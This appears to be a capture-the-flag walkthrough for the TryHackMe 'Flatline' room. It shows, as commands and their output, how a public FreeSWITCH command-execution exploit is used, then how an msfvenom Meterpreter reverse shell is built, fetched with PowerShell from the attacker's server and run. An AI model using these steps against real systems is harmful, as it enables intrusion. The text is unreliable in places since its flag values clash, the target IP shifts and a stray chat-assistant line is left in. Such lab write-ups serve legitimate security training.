<div align="center">[Flatline TryHackMe Walkthrough — Complete Step-by-Step Guide to Root](https://tryhackme.com/room/flatline)</div>


## Task 1 . Flags

### 1.1. What is the user.txt flag?
```
THM{64bca0843d535fa733eecdc59d27cbe26}
```
### 1.2. What is the user.txt flag?
```
THM{8c8bc5558f0f3f8060d00ca231a9fb5e}
```

## Initial Enumeration

As always, I kicked things off with an **Nmap scan** to enumerate the open services running on the target machine (`10.201.79.236`). I used the following command:

```bash
nmap -sV -sC -Pn 10.201.79.236
```

* `-sV` → Detects service versions
* `-sC` → Runs default Nmap scripts for additional info
* `-Pn` → Skips host discovery (treats host as online)

The scan revealed two interesting open ports:

```
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
```

* Port **3389 (RDP)** indicated that the machine was running Microsoft’s Remote Desktop Service.
* Port **8021 (FreeSWITCH mod\_event\_socket)** caught my attention, since FreeSWITCH is a VoIP service that has been known to contain vulnerabilities.

The domain name of the system was also disclosed as:

```
WIN-EOM4PK0578N
```

At this point, my main focus shifted toward the **FreeSWITCH service** to check if it was exploitable.

---

## Finding Vulnerabilities

I searched Exploit-DB using `searchsploit` to see if there were any publicly available exploits for FreeSWITCH:

```bash
searchsploit FreeSWITCH
```

The results looked promising:

```
-$ searchsploit Freeswitch
--------------------------------------------------------- ---------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit) | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                    | windows/remote/47799.txt
--------------------------------------------------------- ---------------------------
```

The second one looked like a straightforward **remote code execution (RCE)** exploit, so I pulled the exploit file for review:

```bash
searchsploit -m windows/remote/47799.txt
cat 47799.txt
```

Inside, I found an example usage that confirmed command execution was possible via the FreeSWITCH event socket.

---

## Exploitation

I decided to test the exploit directly by executing a simple `whoami` command against the target:

```bash
python3 47799.txt 10.201.79.236 whoami
```

The exploit worked!

```
Authenticated
win-eom4pk0578n\nekrotic
```

That confirmed I had remote command execution on the machine as the **Nekrotic** user.

---

## Exploring the File System

With code execution in place, I explored the `C:\` drive to see the file structure:

```bash
python3 47799.txt 10.201.79.236 "dir C:\"
```

Output:

```
PerfLogs
Program Files
Program Files (x86)
projects
Users
Windows
```

Inside the **Users** directory, I found two accounts:

* Administrator
* Nekrotic

Naturally, I went straight for `Nekrotic\Desktop` to check for any flags.

```bash
python3 47799.txt 10.201.79.236 "dir C:\Users\Nekrotic\Desktop"
```

And there they were:

```
user.txt
root.txt
```
Perfect — now I’ll polish your **second part** into a **Medium-optimized walkthrough section** with a smooth flow, headings, SEO keywords, and explanations in first-person style.

---

## 📝 Capturing the User Flag

With remote code execution working, my next goal was to capture the **user flag**. I retried the command execution and this time I was able to successfully read the contents of `user.txt`:

```bash
python3 47799.txt 10.201.15.213 "type C:\\Users\\nekrotic\\Desktop\\user.txt"
```

Output:

```
Authenticated
Content-Type: api/response
Content-Length: 38

THM{64bca0843d535fa73eecdc59d27cbe26}
```

🎉 **User Flag:** `THM{64bca0843d535fa73eecdc59d27cbe26}`

At this stage, I had successfully retrieved the user flag, but attempts to access `root.txt` failed:

```bash
python3 47799.txt 10.201.15.213 "type C:\\Users\\nekrotic\\Desktop\\root.txt"
```

The exploit returned:

```
Authenticated
Content-Type: api/response
Content-Length: 14

-ERR no reply
```

Clearly, I needed a more **stable foothold** to interact with the system properly.

---

## 🎯 Establishing a Reverse Shell

Since direct flag extraction wasn’t reliable, I switched to a more stable approach — gaining a **reverse shell** using `msfvenom` and Metasploit’s handler.

First, I generated a Windows Meterpreter payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.17.30.120 LPORT=4444 -f exe > payload.exe
```

* `-p` → payload type
* `LHOST` → my attacker IP
* `LPORT` → port for reverse connection
* `-f exe` → output format as Windows executable

---

## 🚚 Delivering the Payload

To transfer the payload to the victim machine, I started a simple Python web server on my attack box:

```bash
python3 -m http.server 8000
```

Then, using the FreeSWITCH exploit, I downloaded the payload onto the victim’s Desktop:

```bash
python3 47799.txt 10.201.14.41 "powershell Invoke-WebRequest -URI http://10.17.30.120:8000/payload.exe -o C:\\Users\\Nekrotic\\Desktop\\payload.exe"
```

I confirmed the payload was successfully delivered:

```bash
python3 47799.txt 10.201.14.41 "dir C:\\Users\\Nekrotic\\Desktop"
```

Output:

```
payload.exe
root.txt
user.txt
```

---

## ⚡ Gaining Access with Meterpreter

With the payload on the target, I set up a Metasploit handler to catch the reverse shell:

```bash
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.17.30.120
set LPORT 4444
run
```

Finally, I executed the payload on the victim machine:

```bash
python3 47799.txt 10.201.14.41 "C:\\Users\\Nekrotic\\Desktop\\payload.exe"
```

Boom! I got a **Meterpreter session** back, giving me a much more stable and interactive shell on the victim system.

<img width="595" height="112" alt="Screenshot 2025-09-05 185013" src="https://github.com/user-attachments/assets/81403979-20f5-43f2-a2a8-711e06b224ac" />
